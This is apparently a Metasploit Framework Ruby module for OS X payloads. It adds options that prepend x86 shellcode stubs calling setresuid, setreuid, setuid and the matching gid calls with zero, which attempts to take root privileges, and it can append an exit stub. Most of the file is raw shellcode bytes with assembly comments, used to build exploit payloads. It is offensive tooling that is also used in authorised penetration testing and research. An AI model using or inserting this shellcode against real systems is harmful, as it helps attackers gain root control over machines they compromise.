# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced features for osx-based
# payloads. OSX payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Osx

  #
  # This mixin is chained within payloads that target the OSX platform.
  # It provides special prepends, to support things like chroot and setuid.
  #
  def initialize(info = {})
    ret = super(info)

    register_advanced_options(
      [
        Msf::OptBool.new('PrependSetresuid',
          [
            false,
            "Prepend a stub that executes the setresuid(0, 0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetreuid',
          [
            false,
            "Prepend a stub that executes the setreuid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetuid',
          [
            false,
            "Prepend a stub that executes the setuid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetresgid',
          [
            false,
            "Prepend a stub that executes the setresgid(0, 0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetregid',
          [
            false,
            "Prepend a stub that executes the setregid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetgid',
          [
            false,
            "Prepend a stub that executes the setgid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('AppendExit',
          [
            false,
            "Append a stub that executes the exit(0) system call",
            "false"
          ]
        ),
      ], Msf::Payload::Osx)

    ret
  end


  #
  # Overload the generate() call to prefix our stubs
  #
  def generate(*args)
    # Call the real generator to get the payload
    buf = super(*args)
    pre = ''
    app = ''

    test_arch = [ *(self.arch) ]

    # Handle all x86 code here
    if (test_arch.include?(ARCH_X86))

      # Prepend

      if (datastore['PrependSetresuid'])
        # setresuid(0, 0, 0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x66\xb8\x37\x01"     +#   movw    $0x0137,%ax                #
               "\xcd\x80"              #   int     $0x80                      #
      end

      if (datastore['PrependSetreuid'])
        # setreuid(0, 0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\xb0\x7e"             +#   movb    $0x7e,%al                  #
               "\xcd\x80"              #   int     $0x80                      #
      end

      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\xb0\x17"             +#   movb    $0x17,%al                  #
               "\xcd\x80"              #   int     $0x80                      #
      end

      if (datastore['PrependSetresgid'])
        # setresgid(0, 0, 0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x66\xb8\x38\x01"     +#   movw    $0x0138,%ax                #
               "\xcd\x80"              #   int     $0x80                      #
      end

      if (datastore['PrependSetregid'])
        # setregid(0, 0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\xb0\x7f"             +#   movb    $0x7f,%al                  #
               "\xcd\x80"              #   int     $0x80                      #
      end

      if (datastore['PrependSetgid'])
        # setgid(0)
        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\x50"                 +#   pushl   %eax                       #
               "\xb0\xb5"             +#   movb    $0xb5,%al                  #
               "\xcd\x80"              #   int     $0x80                      #
      end
      # Append

      if (datastore['AppendExit'])
        # exit(0)
        app << "\x31\xc0"             +#   xorl    %eax,%eax                  #
               "\x50"                 +#   pushl   %eax                       #
               "\xb0\x01"             +#   movb    $0x01,%al                  #
               "\xcd\x80"              #   int     $0x80                      #
      end

    end

    return (pre + buf + app)
  end


end
